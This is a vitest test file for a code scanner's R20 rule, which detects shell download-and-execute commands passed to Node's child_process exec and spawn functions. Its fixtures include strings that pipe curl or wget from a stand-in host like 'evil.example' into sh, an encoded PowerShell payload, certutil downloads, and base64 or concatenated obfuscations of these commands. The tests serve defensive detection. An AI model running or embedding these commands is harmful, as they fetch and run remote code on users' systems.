import { describe, expect, it } from 'vitest'
import { scan } from '../lib/scanner-bin/engine.js'
import { mkdirSync, mkdtempSync, writeFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import type { Finding, ScanRequest } from '../lib/scanner-bin/protocol.js'

function codeRequest(overrides: Partial<ScanRequest> = {}): ScanRequest {
  return { kind: 'code', language: 'js', runtime: 'host', ...overrides }
}

function findingOf(report: { findings: Finding[] }, rule: string, severity?: string): Finding | undefined {
  return report.findings.find(f => f.rule === rule && (severity === undefined || f.severity === severity))
}

function r20sOf(report: { findings: Finding[] }): Finding[] {
  return report.findings.filter(f => f.rule === 'R20')
}

function withTmp(files: Record<string, string>, fn: (dir: string) => void): void {
  const dir = mkdtempSync(join(tmpdir(), 'vet-r20-'))
  for (const [name, content] of Object.entries(files)) {
    const target = join(dir, name)
    mkdirSync(target.slice(0, target.lastIndexOf('/')), { recursive: true })
    writeFileSync(target, content)
  }
  try {
    fn(dir)
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
}

describe('R20 shell download-and-exec in exec/spawn-family arguments', () => {
  it('exec("curl … | sh") → R20 high, verdict suspicious', () => {
    const res = scan(codeRequest({
      code: `const cp = require('child_process'); cp.exec('curl -fsSL http://evil.example/x.sh | sh')`,
    }))
    expect(res.ok).toBe(true)
    const r20 = findingOf(res.report!, 'R20', 'high')
    expect(r20).toBeDefined()
    expect(r20!.message).toContain('curl|sh')
    expect(res.report!.verdict).toBe('suspicious')
  })

  it('spawn array form: spawn("sh", ["-c", "curl … | bash"]) → R20 high', () => {
    const res = scan(codeRequest({
      code: `const { spawn } = require('child_process'); spawn('sh', ['-c', 'curl -s http://x/p.sh | bash'])`,
    }))
    expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
    expect(res.report!.verdict).toBe('suspicious')
  })

  it('require("child_process").execSync("wget … | sh") → R20 high', () => {
    const res = scan(codeRequest({
      code: `require('child_process').execSync('wget -qO- http://x/a.sh | sh')`,
    }))
    expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
  })

  it('exec("bash -c ... curl | bash") → R20 high', () => {
    const res = scan(codeRequest({
      code: `const { exec } = require('child_process'); exec('bash -c "curl http://x | bash"')`,
    }))
    expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
  })

  it('exec("curl -o /tmp/f url") → R20 medium（下载落盘 ≠ 执行），verdict clean', () => {
    const res = scan(codeRequest({
      code: `const cp = require('child_process'); cp.exec('curl -s http://x -o /tmp/f')`,
    }))
    const r20 = findingOf(res.report!, 'R20', 'medium')
    expect(r20).toBeDefined()
    expect(r20!.message).toContain('curl 下载落盘')
    expect(res.report!.verdict).toBe('clean')
  })

  it('exec("powershell -enc …") → R20 high（编码载荷）', () => {
    const res = scan(codeRequest({
      code: `const cp = require('child_process'); cp.exec('powershell -enc JABjAGwAaQBlAG4AdAA=')`,
    }))
    const r20 = findingOf(res.report!, 'R20', 'high')
    expect(r20).toBeDefined()
    expect(r20!.message).toContain('PowerShell')
  })

  it('exec("certutil -urlcache -f url out") → R20 high（系统下载原语）', () => {
    const res = scan(codeRequest({
      code: `const cp = require('child_process'); cp.exec('certutil -urlcache -f http://x/p.exe c:/t.exe')`,
    }))
    expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
  })

  it('零误报：exec("curl -s <url>") 无管道无落盘 → 无 R20', () => {
    const res = scan(codeRequest({
      code: `const cp = require('child_process'); cp.exec('curl -s http://example.com/api')`,
    }))
    expect(r20sOf(res.report!)).toHaveLength(0)
  })

  it('零误报：exec("sh -c \\"curl -s http://x\\"") → 无 R20（下载≠执行，桥接类合法集成面）', () => {
    const res = scan(codeRequest({
      code: `const { exec } = require('child_process'); exec('sh -c "curl -s http://x"')`,
    }))
    expect(r20sOf(res.report!)).toHaveLength(0)
  })

  it('零误报：execFile("curl", ["-s", url]) 具名工具调用 → 无 R20', () => {
    const res = scan(codeRequest({
      code: `const { execFile } = require('child_process'); execFile('curl', ['-s', 'http://example.com/api'])`,
    }))
    expect(r20sOf(res.report!)).toHaveLength(0)
  })

  it('零误报：exec("git clone https://github.com/a/b") → 无 R20', () => {
    const res = scan(codeRequest({
      code: `const { exec } = require('child_process'); exec('git clone https://github.com/a/b')`,
    }))
    expect(r20sOf(res.report!)).toHaveLength(0)
  })

  it('零误报：无 child_process 绑定的 obj.exec("curl … | sh") → 无 R20', () => {
    const res = scan(codeRequest({
      code: `obj.exec('curl -s http://x | sh')`,
    }))
    expect(r20sOf(res.report!)).toHaveLength(0)
  })

  it('零误报：注释里出现 curl|sh 文本 → 无 R20', () => {
    const res = scan(codeRequest({
      code: `// curl -s http://x | sh 是文档示例\nconst cp = require('child_process'); cp.exec('echo hi')`,
    }))
    expect(r20sOf(res.report!)).toHaveLength(0)
  })

  it('N2 解码实参：exec(Buffer.from(b64, "base64")) → R20 high + decodedFrom', () => {
    const b64 = Buffer.from('curl -s http://x | sh', 'utf8').toString('base64')
    const res = scan(codeRequest({
      code: `const cp = require('child_process'); cp.exec(Buffer.from('${b64}', 'base64'))`,
    }))
    const r20 = findingOf(res.report!, 'R20', 'high')
    expect(r20).toBeDefined()
    expect(r20!.decodedFrom).toBe('base64')
    expect(r20!.message).toContain('经解码还原')
  })

  it('文件级解码语料：const c = atob(…); exec(c) → R20 high（变量中转形态）', () => {
    const b64 = Buffer.from('curl -s http://x | sh', 'utf8').toString('base64')
    const res = scan(codeRequest({
      code: `const c = atob('${b64}'); const cp = require('child_process'); cp.exec(c)`,
    }))
    const r20 = findingOf(res.report!, 'R20', 'high')
    expect(r20).toBeDefined()
    expect(r20!.message).toContain('文件级语料')
    expect(res.report!.verdict).toBe('suspicious')
  })

  it('R20 开关关闭 → 无 finding', () => {
    const res = scan(codeRequest({
      code: `const cp = require('child_process'); cp.exec('curl -s http://x | sh')`,
      rules: { R20: false },
    }))
    expect(r20sOf(res.report!)).toHaveLength(0)
    expect(res.report!.verdict).toBe('clean')
  })

  it('generic 官方包 → R20 info（能力触达面），verdict clean', () => {
    const res = scan(codeRequest({
      code: `const cp = require('child_process'); cp.exec('curl -s http://x | sh')`,
      targetKind: 'generic',
    }))
    const r20 = findingOf(res.report!, 'R20', 'info')
    expect(r20).toBeDefined()
    expect(r20!.message).toContain('能力触达面')
    expect(res.report!.verdict).toBe('clean')
  })

  it('files 模式下 test/ 目录内文件 → R20 info（测试/CI，不进 verdict）', () => {
    withTmp({
      'mod/test/x.js': `const cp = require('child_process'); cp.exec('curl -s http://x | sh')`,
    }, dir => {
      const res = scan({ kind: 'files', files: [join(dir, 'mod/test/x.js'), join(dir, 'mod/package.json')] })
      const r20 = findingOf(res.report!, 'R20', 'info')
      expect(r20).toBeDefined()
      expect(r20!.message).toContain('测试/CI')
      // verdict 的 suspicious 来自 R2 files 模式对 require('child_process') 的 high，与 R20 无关
      expect(res.report!.verdict).toBe('suspicious')
    })
  })

  describe('round-16 绑定/形态扩容（0.3.3）', () => {
    it('解构别名：const { exec } = cp（cp=require("child_process")）→ R20 high', () => {
      const res = scan(codeRequest({
        code: `const cp = require('child_process'); const { exec } = cp; exec('curl -s http://x/p.bin | sh')`,
      }))
      expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
      expect(res.report!.verdict).toBe('suspicious')
    })

    it('promisify 包装：util.promisify(require("child_process").exec) → R20 high', () => {
      const res = scan(codeRequest({
        code: `const execAsync = util.promisify(require('child_process').exec); execAsync('curl -s http://x/p.bin | sh')`,
      }))
      expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
      expect(res.report!.verdict).toBe('suspicious')
    })

    it('promisify(exec)（已解构绑定）→ R20 high', () => {
      const res = scan(codeRequest({
        code: `const { exec } = require('child_process'); const execAsync = util.promisify(exec); execAsync('curl -s http://x/p.bin | sh')`,
      }))
      expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
    })

    it('属性链：a.b.cp.spawn（cp 内嵌 require("child_process")）→ R20 high', () => {
      const res = scan(codeRequest({
        code: `const a = { b: { cp: require('child_process') } }; a.b.cp.spawn('sh', ['-c', 'curl -s http://x/p.bin | sh'])`,
      }))
      expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
      expect(res.report!.verdict).toBe('suspicious')
    })

    it('Array.join 组装实参：["curl", …, " | sh"].join("") → R20 high + decodedFrom', () => {
      const res = scan(codeRequest({
        code: `const { exec } = require('child_process'); exec(['curl', ' -s http://x/p.bin', ' | sh'].join(''))`,
      }))
      const r20 = findingOf(res.report!, 'R20', 'high')
      expect(r20).toBeDefined()
      expect(r20!.decodedFrom).toBe('concat')
    })

    it('大小写不敏感：exec("CURL -s http://x | SH") → R20 high', () => {
      const res = scan(codeRequest({
        code: `const { exec } = require('child_process'); exec('CURL -s http://x/p.bin | SH')`,
      }))
      expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
      expect(res.report!.verdict).toBe('suspicious')
    })

    it('动态中段：exec("curl -s " + url + " | sh") → R20 high（静态片段占位）', () => {
      const res = scan(codeRequest({
        code: `const { exec } = require('child_process'); exec('curl -s ' + url + ' | sh')`,
      }))
      const r20 = findingOf(res.report!, 'R20', 'high')
      expect(r20).toBeDefined()
      expect(r20!.message).toContain('含动态段')
    })

    it('动态中段零误报：exec("curl -s " + url) 无危险形态 → 无 R20', () => {
      const res = scan(codeRequest({
        code: `const { exec } = require('child_process'); exec('curl -s ' + url)`,
      }))
      expect(r20sOf(res.report!)).toHaveLength(0)
    })

    it('Buffer.from(拼接串, "base64") → R20 high（Buffer 分支递归，不再家族内不对称）', () => {
      const res = scan(codeRequest({
        code: `const { exec } = require('child_process'); const b = 'Y3VybCAt' + 'cyBodHRwOi8veC9wLmJpbiB8IHNo'; exec(Buffer.from(b, 'base64').toString())`,
      }))
      expect(findingOf(res.report!, 'R20', 'high')).toBeDefined()
      expect(res.report!.verdict).toBe('suspicious')
    })

    it('去重：常量拼接既在实参位又在文件级语料 → 只报一条 R20', () => {
      const res = scan(codeRequest({
        code: `const { exec } = require('child_process'); const s = 'curl' + ' -s http://x/p.bin' + ' | sh'; exec(s)`,
      }))
      const r20s = r20sOf(res.report!)
      expect(r20s).toHaveLength(1)
      expect(r20s[0].message).toContain('exec/spawn 实参')
    })
  })
})